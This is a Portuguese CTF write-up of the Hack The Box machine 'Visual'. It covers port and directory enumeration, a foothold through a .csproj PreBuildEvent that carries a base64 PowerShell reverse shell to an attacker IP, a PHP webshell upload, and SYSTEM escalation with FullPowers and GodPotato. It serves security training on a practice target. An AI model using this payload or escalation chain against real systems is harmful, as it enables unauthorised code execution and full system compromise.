---
description: CTF do Hack The Box como fiz e anotações.
title: HackTheBox - Visual - Médio
date: 2024-02-17 00:17:00 +/-0300
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, windows, script, web, medio]     # TAG names should always be lowercase
show_image_post: true
---
![logo](/assets/img/visual.png){: w="100" h="100" .left}

---
# **CTF - Visual**
---
---
## **Enumeração**

### nmap

```shell
╰─ sudo nmap -Pn -sS -sV --min-rate 5000 -stats-every 7s -p- 10.10.11.234 -oN nmapSC -sC

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 20:59 -03
Nmap scan report for 10.10.11.234
Host is up (0.14s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: Visual - Revolutionizing Visual Studio Builds

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.20 seconds
```
{: .nolineno }

Porta 80 site de compilação de projetos dotnet etc:

![alt text](/assets/img/visual/visual1.png)
![alt text](/assets/img/visual/visual2.png)

### ffuf
```shell
╰─ ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 200 -u http://10.10.11.234/FUZZ -e .html,.txt,.php   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.234/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 150ms]
.htaccess.php           [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 155ms]
.htpasswd.php           [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 156ms]
.htaccess.html          [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 156ms]
.htpasswd               [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 156ms]
.htpasswd.txt           [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 156ms]
.htaccess.txt           [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 157ms]
Index.php               [Status: 200, Size: 7534, Words: 2665, Lines: 118, Duration: 139ms]
.htpasswd.html          [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 136ms]
assets                  [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 144ms]
aux                     [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 162ms]
aux.html                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 163ms]
aux.txt                 [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 163ms]
aux.php                 [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 163ms]
cgi-bin/                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 150ms]
cgi-bin/.html           [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 140ms]
com1.txt                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 136ms]
com1.html               [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 137ms]
com1                    [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 137ms]
com2                    [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 137ms]
com1.php                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 139ms]
com3.html               [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 140ms]
com2.txt                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 141ms]
com3.php                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 140ms]
com4.html               [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 141ms]
com4                    [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 141ms]
com2.html               [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 143ms]
com4.php                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 142ms]
com3.txt                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 143ms]
com4.txt                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 142ms]
com3                    [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 144ms]
com2.php                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 143ms]
con                     [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 137ms]
con.html                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 138ms]
con.txt                 [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 138ms]
con.php                 [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 135ms]
css                     [Status: 301, Size: 335, Words: 22, Lines: 10, Duration: 149ms]
index.php               [Status: 200, Size: 7534, Words: 2665, Lines: 118, Duration: 154ms]
js                      [Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 138ms]
licenses                [Status: 403, Size: 421, Words: 37, Lines: 12, Duration: 140ms]
lpt1                    [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 142ms]
lpt2                    [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 142ms]
lpt1.html               [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 146ms]
lpt2.txt                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 145ms]
lpt1.php                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 147ms]
lpt2.php                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 146ms]
lpt1.txt                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 148ms]
lpt2.html               [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 147ms]
nul.php                 [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 147ms]
nul.html                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 171ms]
nul.txt                 [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 171ms]
nul                     [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 174ms]
phpmyadmin              [Status: 403, Size: 421, Words: 37, Lines: 12, Duration: 139ms]
prn.php                 [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 161ms]
prn                     [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 163ms]
prn.txt                 [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 164ms]
prn.html                [Status: 403, Size: 302, Words: 22, Lines: 10, Duration: 166ms]
server-info             [Status: 403, Size: 421, Words: 37, Lines: 12, Duration: 148ms]
server-status           [Status: 403, Size: 421, Words: 37, Lines: 12, Duration: 147ms]
submit.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 155ms]
uploads                 [Status: 301, Size: 339, Words: 22, Lines: 10, Duration: 135ms]
webalizer               [Status: 403, Size: 421, Words: 37, Lines: 12, Duration: 164ms]
:: Progress: [81904/81904] :: Job [1/1] :: 165 req/sec :: Duration: [0:01:35] :: Errors: 47 ::
```
{: .nolineno }

`http://10.10.11.234/submit.php` funciona com o campo da página inicial

![alt text](/assets/img/visual/visual3.png)
![alt text](/assets/img/visual/visual4.png)

### Burp

burp no post de submit.php

![alt text](/assets/img/visual/visual5.png)

## **Acesso/FootHold**

É preciso um projeto dotnet pra enviar ao servidor via git, como o servidor não tem acesso a internet, vou criar também um git localmente.
O arquivo .csproj pode executar comandos prebuild veja [aqui](https://learn.microsoft.com/en-us/cpp/build/how-to-use-build-events-in-msbuild-projects?view=msvc-170), então será executado um comando pra powershell reverso.
Usado o powershell base64 que tem aqui <https://n00br00t.github.io/sh/>

### Criando Um projeto dotnet

`mkdir dotnet; cd dotnet`  
`dotnet new console -n xd`  
`dotnet sln add xd/xd.csproj`  

```shell
╭─      ~/HTB/visual/dotnet         
╰─ dotnet new console -n xd
The template "Console App" was created successfully.

Processing post-creation actions...
Running 'dotnet restore' on /home/kali/HTB/visual/dotnet/xd/xd.csproj...
  Determining projects to restore...
  Restored /home/kali/HTB/visual/dotnet/xd/xd.csproj (in 3.61 sec).
Restore succeeded.


╭─      ~/HTB/visual/dotnet     
╰─ dotnet sln add xd/xd.csproj
Project `xd/xd.csproj` added to the solution.
╭─      ~/HTB/visual/dotnet   
╰─ tree .   
.
├── xd
│   ├── obj
│   │   ├── project.assets.json
│   │   ├── project.nuget.cache
│   │   ├── xd.csproj.nuget.dgspec.json
│   │   ├── xd.csproj.nuget.g.props
│   │   └── xd.csproj.nuget.g.targets
│   ├── Program.cs
│   └── xd.csproj
└── xd.sln

3 directories, 8 files
```
{: .nolineno }

Editando o xd.csproj pra adicionar o payload a ser executado e nos dar a reverse shell
O payload tem que ficar entre as tags `<PreBuildEvent> </PreBuildEvent>`  
```c#
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  <PreBuildEvent>
    powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAyADkAIgAsADQANAA0ADUAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
    </PreBuildEvent>
   </PropertyGroup>
</Project>
```
{: .nolineno }
### Criando o repositório git
`git init`  
`git add .`  
`git commit -m "add"`  
`cd .git`  
`git --bare update-server-info`  
```shell
╭─      ~/HTB/visual/dotnet      
╰─ git init                     
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint:   git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint:   git branch -m <name>
Initialized empty Git repository in /home/kali/HTB/visual/dotnet/.git/
╭─      ~/HTB/visual/dotnet     master ?2      
╰─ git add .
╭─      ~/HTB/visual/dotnet     master +8  
╰─ git commit -m "add"
[master (root-commit) fb20af6] add
 8 files changed, 218 insertions(+)
 create mode 100644 xd.sln
 create mode 100644 xd/Program.cs
 create mode 100644 xd/obj/project.assets.json
 create mode 100644 xd/obj/project.nuget.cache
 create mode 100644 xd/obj/xd.csproj.nuget.dgspec.json
 create mode 100644 xd/obj/xd.csproj.nuget.g.props
 create mode 100644 xd/obj/xd.csproj.nuget.g.targets
 create mode 100644 xd/xd.csproj
╭─      ~/HTB/visual/dotnet     master 
╰─ cd .git  
╭─      ~/HTB/visual/dotnet/.git     master 
╰─ git --bare update-server-info
```
{: .nolineno }

Rodei o `python3 http.server 80` na pasta do projeto dotnet,
no site adicionei o endereço http://MEUIP/.git e aguardei receber a reverse shell.

> Caso precisar editar o xd.csproj por algum motivo do payload não der certo, após editar tem que executar esses comandos pra atualizar o git local.  
`git commit -a`  
`cd .git`  
`git --bare update-server-info`  
{: .prompt-warning}

![alt text](/assets/img/visual/visual6.png)

### Primeira Flag
![alt text](/assets/img/visual/visual7.png)

Com icacls no diretório do xampp foi possível ver que tenho acesso de escrita, resolvi enviar a powny shell, webshell em php.

> Recomendo usar essas reverse shells da imagem que podem ser encontradas em <https://n00br00t.github.io/sh/>, pois o procedimento de escalar privilégio não funciona via powershell, somente pelo cmd.exe. Eu tive que refazer o procedimento.  
![alt text](/assets/img/visual/visual11.png)
{: .prompt-tip}

Download da webshell powny pro xampp

![alt text](/assets/img/visual/visual8.png)

Acessando a powny.php
![alt text](/assets/img/visual/visual9.png)

Executando outra reverse shell a partir da powny shell pra ficar mais interativa.
![alt text](/assets/img/visual/visual10.png)

## **Escalação Privilégio**

Pesquisa sobre como escalar privilégio com o usuário `nt authority\local service` encontrei esse git, entre outros informativos.
<https://github.com/itm4n/FullPowers?source=post_page-----be0130b1c2df-------------------------------->
  
>Escalar privilégio com usuários `NT AUTHORITY\LOCAL SERVICE` e `NT AUTHORITY\NETWORK SERVICE`  para `NT AUTHORITY\SYSTEM`  <https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens>  
Executar [FullPowers.exe](https://github.com/itm4n/FullPowers?source=post_page-----be0130b1c2df--------------------------------) pra recuperar os privilégios default:  
`SeAssignPrimaryToken` and `SeImpersonatePrivilege` etc  
Com `SeImpersonatePrivilege` é possível abusar dos Access Token com [GodPotato](https://github.com/BeichenDream/GodPotato)  
Exemplo: `GodPotato -cmd "cmd /c whoami"`  
Referencias:  
- <https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens>  
- <https://juggernaut-sec.com/seimpersonateprivilege/>
{: .prompt-tip}

### FullPowers

Executando fullpowers pra obter os privilégios default

```shell
C:\xampp\htdocs>FullPowers.exe
[+] Started dummy thread with id 4976
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.4851]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

C:\Windows\system32>
```
{: .nolineno }

### GodPotato

Com godpotato conseguimos executar comandos como `NT AUTHORITY\SYSTEM`
Já executei o comando pra ler a root flag.
```shell
C:\xampp\htdocs>god.exe -cmd "cmd /c type c:\users\administrator\desktop\root.txt"
[*] CombaseModule: 0x140710041812992
[*] DispatchTable: 0x140710044119152                                                          
[*] UseProtseqFunction: 0x140710043495328                                                         
[*] UseProtseqFunctionParamCount: 6                                                           
[*] HookRPC                                                     
[*] Start PipeServer                                                  
[*] Trigger RPCSS                                                       
[*] CreateNamedPipe \\.\pipe\a21c6fb8-c1eb-4140-b437-39a026cef91b\pipe\epmapper    
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046                        
[*] DCOM obj IPID: 0000a802-0b84-ffff-f7fb-4de017ad2aef                        
[*] DCOM obj OXID: 0x953ee9b898cea310
[*] DCOM obj OID: 0x99c9754ce36a6db3
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 868 Token:0x756  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1104
86e1825a0a14xxxxxxxxxx4664a56d15
```
{: .nolineno }

![alt text](/assets/img/visual/visual12.png)

**Conhecimentos adquiridos:**
- Escalação de privilégio do usuário nt authority\local service para nt authority\system
- Exploit do site
- Criação de um projeto dotnet
- Criação de um git local

![alt text](/assets/img/visual/visual13.png)